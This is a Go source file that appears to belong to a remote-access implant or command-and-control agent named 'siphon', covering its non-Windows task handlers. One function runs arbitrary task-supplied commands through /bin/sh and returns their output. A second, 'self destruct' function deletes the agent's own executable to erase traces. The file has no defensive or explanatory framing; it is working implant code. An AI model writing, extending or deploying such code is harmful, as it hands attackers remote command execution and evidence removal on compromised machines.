//go:build !windows

package main

import (
	"bytes"
	"fmt"
	"os"
	"os/exec"

	"siphon/shared"
)

// executeCmdStealthy on non-Windows just uses /bin/sh (same as normal).
func executeCmdStealthy(task *shared.Task) shared.TaskResult {
	cmd := exec.Command("/bin/sh", "-c", task.Args)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	if err != nil {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: out.String() + "\nerror: " + err.Error()}
	}
	return shared.TaskResult{TaskID: task.ID, Success: true, Output: out.String()}
}

// executeSelfDestruct on non-Windows just deletes the binary and exits.
func executeSelfDestruct(task *shared.Task) shared.TaskResult {
	exePath, err := os.Executable()
	if err != nil {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("resolve exe: %v", err)}
	}
	if err := os.Remove(exePath); err != nil {
		return shared.TaskResult{TaskID: task.ID, Success: false, Output: fmt.Sprintf("delete failed: %v", err)}
	}
	return shared.TaskResult{TaskID: task.ID, Success: true, Output: fmt.Sprintf("deleted: %s", exePath)}
}
